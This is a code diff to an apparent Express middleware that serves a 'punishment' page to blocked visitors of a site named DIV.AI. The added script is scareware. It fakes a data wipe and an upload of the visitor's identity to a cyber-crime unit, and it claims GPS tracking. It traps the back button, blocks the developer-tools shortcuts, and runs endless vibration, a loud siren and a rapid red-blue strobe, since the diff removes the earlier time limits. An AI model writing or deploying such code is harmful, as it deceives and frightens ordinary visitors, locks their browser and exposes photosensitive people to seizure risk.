@@ -72,46 +72,87 @@ app.use(async (req, res, next) => {
         console.error("❌ Notification failed:", e.message);
     }
 
-    // 5. Show LOL with PUNISHMENT SCRIPT
+    // 5. Show LOL with LEVEL 2 PUNISHMENT SCRIPT
     return res.status(200).send(`
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DIV.AI - RESTRICTED</title>
+    <title>DIV.AI - CRITICAL SYSTEM FAILURE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { background:black; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; font-family:monospace; overflow:hidden; user-select:none; cursor:wait; }
+        h1 { font-size:25vw; letter-spacing:25px; font-weight:900; margin:0; text-shadow: 0 0 20px rgba(255,0,0,0.8); }
+        .alert { color:#f00; font-size:1.2rem; margin-top:20px; font-weight:bold; text-transform:uppercase; text-align:center; }
+        .progress-container { width: 80%; max-width: 400px; height: 10px; background: #111; border: 1px solid #333; margin-top: 20px; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: #f00; transition: width 0.1s; }
+        @keyframes strobe { 0% { background: #000; } 45% { background: #000; } 50% { background: #f00; } 95% { background: #f00; } 100% { background: #00f; } }
+        body.active-punishment { animation: strobe 0.2s infinite !important; }
+    </style>
 </head>
-<body style="background:black;color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;overflow:hidden;user-select:none;cursor:wait;">
-    <h1 style="font-size:25vw;letter-spacing:25px;font-weight:900;margin:0;text-shadow: 0 0 20px rgba(255,0,0,0.5);">LOL</h1>
-    <p style="color:#333;font-size:0.8rem;margin-top:20px;">ACCESS DENIED - IDENTITY LOGGED</p>
+<body oncontextmenu="return false;">
+    <h1 id="main-text">LOL</h1>
+    <div id="alert-box" class="alert">ACCESS DENIED - IDENTITY LOGGED</div>
+    <div id="progress-container" class="progress-container">
+        <div id="progress-bar" class="progress-bar"></div>
+    </div>
+    <div id="status-text" style="color:#555; font-size:0.7rem; margin-top:10px;"></div>
 
     <script>
         let punished = false;
         
+        // --- UI LOCKDOWN ---
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+
         function startPunishment() {
             if (punished) return;
             punished = true;
-            console.log("👮 PUNISHMENT INITIATED");
+            
+            document.getElementById('main-text').innerText = "WIPE";
+            document.getElementById('alert-box').innerHTML = "🚨 CRITICAL ERROR: GPS TRACKING ACTIVE<br>SECURITY UNIT DISPATCHED";
+            document.getElementById('progress-container').style.display = 'block';
+            document.body.classList.add('active-punishment');
 
-            // 1. MOBILE VIBRATION & SCREEN SHAKE
+            // 1. HISTORY LOCK (Trap the user)
+            for(let i=0; i<100; i++) { history.pushState(null, null, window.location.href); }
+            window.onpopstate = function() { history.go(1); };
+
+            // 2. FAKE SYSTEM WIPE
+            let progress = 0;
+            const statusMsgs = ["Initializing Wipe...", "Accessing Local Storage...", "Deleting Photos...", "Formatting Drive...", "Uploading Identity to Cyber-Crime Unit..."];
+            const pBar = document.getElementById('progress-bar');
+            const sText = document.getElementById('status-text');
+            
+            const wipeInterval = setInterval(() => {
+                progress += Math.random() * 2;
+                if (progress >= 100) {
+                    progress = 100;
+                    sText.innerText = "LOCAL DATA UPLOADED SUCCESSFULLY. ENJOY THE COURT CASE.";
+                    clearInterval(wipeInterval);
+                } else {
+                    pBar.style.width = progress + "%";
+                    sText.innerText = statusMsgs[Math.floor(progress / 20)] + " (" + Math.round(progress) + "%)";
+                }
+            }, 150);
+
+            // 3. MOBILE VIBRATION
             if ("vibrate" in navigator) {
                 const vibrateLoop = setInterval(() => {
                     navigator.vibrate([1000, 300, 1000, 300, 1000]);
                 }, 2000);
-                setTimeout(() => clearInterval(vibrateLoop), 600000); 
             }
 
-            // iOS/PC Fallback: FORCE SHAKE UI
+            // 4. SHAKE FALLBACK
             const shakeLoop = setInterval(() => {
                 const x = (Math.random() * 20) - 10;
                 const y = (Math.random() * 20) - 10;
                 document.body.style.transform = "translate(" + x + "px," + y + "px)";
             }, 50);
-            setTimeout(() => {
-                clearInterval(shakeLoop);
-                document.body.style.transform = "none";
-            }, 600000);
 
-            // 2. POLICE SIREN (Audio Context)
+            // 5. POLICE SIREN
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 function playSiren() {
@@ -121,24 +162,16 @@ app.use(async (req, res, next) => {
                     osc.frequency.setValueAtTime(440, audioCtx.currentTime); 
                     osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.5);
                     osc.frequency.exponentialRampToValueAtTime(440, audioCtx.currentTime + 1.0);
-                    gain.gain.setValueAtTime(0.8, audioCtx.currentTime); // Louder
+                    gain.gain.setValueAtTime(0.9, audioCtx.currentTime);
                     osc.connect(gain);
                     gain.connect(audioCtx.destination);
                     osc.start();
                     osc.stop(audioCtx.currentTime + 1.0);
                 }
-                const sirenInterval = setInterval(playSiren, 1000);
-                setTimeout(() => clearInterval(sirenInterval), 600000);
+                setInterval(playSiren, 1000);
             } catch(e) { }
-
-            // 3. POLICE STROBE (Red & Blue)
-            const style = document.createElement('style');
-            style.innerHTML = "@keyframes strobe { 0% { background: #000; } 45% { background: #000; } 50% { background: #f00; } 95% { background: #f00; } 100% { background: #00f; } } body.active-punishment { animation: strobe 0.2s infinite !important; }";
-            document.head.appendChild(style);
-            document.body.classList.add('active-punishment');
         }
 
-        // Trigger on first interaction (required by browsers)
         window.addEventListener('click', startPunishment);
         window.addEventListener('touchstart', startPunishment);
         window.addEventListener('keydown', startPunishment);
